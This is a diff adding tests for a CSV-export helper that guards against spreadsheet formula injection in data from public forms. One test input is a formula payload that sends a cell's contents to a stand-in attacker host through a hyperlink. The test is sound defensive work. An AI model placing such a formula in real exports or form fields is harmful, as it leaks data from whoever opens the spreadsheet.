@@ -3018,6 +3018,38 @@ function unzipDocumentXml(buf) {
       soft.tiny.ok === false && soft.floor === 320 && /320 pixels/.test(soft.tiny.reason));
     ok('an unsendable format gets advice a family can act on, naming the format',
       /HEIC/.test(soft.help) && /Most Compatible|JPEG/.test(soft.help));
+    /* CSV exports carry names and free text typed into PUBLIC forms. Excel,
+       Sheets and LibreOffice all treat a cell beginning with =, +, - or @ as a
+       formula, so an applicant who registers as `=HYPERLINK(...)` gets that run
+       on the machine of whoever opens the export. Quoting alone does not stop
+       it — the parser strips the quotes before deciding. */
+    const csv = await pc.evaluate(() => ({
+      formula:  window.nggCsvCell('=HYPERLINK("http://evil.example/"&A1,"Payroll")'),
+      plus:     window.nggCsvCell('+1234'),
+      minus:    window.nggCsvCell('-2+3'),
+      at:       window.nggCsvCell('@SUM(A1:A9)'),
+      tab:      window.nggCsvCell('\t=cmd'),
+      ordinary: window.nggCsvCell('Temiloluwa Adeyemi'),
+      comma:    window.nggCsvCell('Adeyemi, Temiloluwa'),
+      quoted:   window.nggCsvCell('She said "hello"'),
+      empty:    window.nggCsvCell(null),
+      minusNum: window.nggCsvCell(-5),
+    }));
+    ok('a formula in an exported cell is neutralised, not just quoted',
+      csv.formula.indexOf('"\'=HYPERLINK') === 0);
+    ok('every leading formula character is caught, not only "="',
+      csv.plus.indexOf('"\'+') === 0 && csv.minus.indexOf('"\'-') === 0 && csv.at.indexOf('"\'@') === 0);
+    ok('a leading tab is caught too — spreadsheets skip it before deciding',
+      csv.tab.indexOf('"\'\t') === 0);
+    ok('an ordinary name is untouched apart from quoting', csv.ordinary === '"Temiloluwa Adeyemi"');
+    ok('a comma stays inside one cell', csv.comma === '"Adeyemi, Temiloluwa"');
+    ok('an embedded quote is doubled per RFC 4180', csv.quoted === '"She said ""hello"""');
+    ok('an empty value is an empty cell, not the word null', csv.empty === '""');
+    /* A negative NUMBER is escaped too. That is deliberate: the guard cannot
+       tell -5 from -2+3, and a leading apostrophe on a number is a cosmetic
+       cost, while a formula is an executable one. */
+    ok('a negative number is escaped as well, erring toward safety', csv.minusNum === '"\'-5"');
+
 
     /* ── The optimiser not arriving must not refuse the photo ──────────────
      * /vendor/image-tools.js is lazy-loaded. When that one request does not
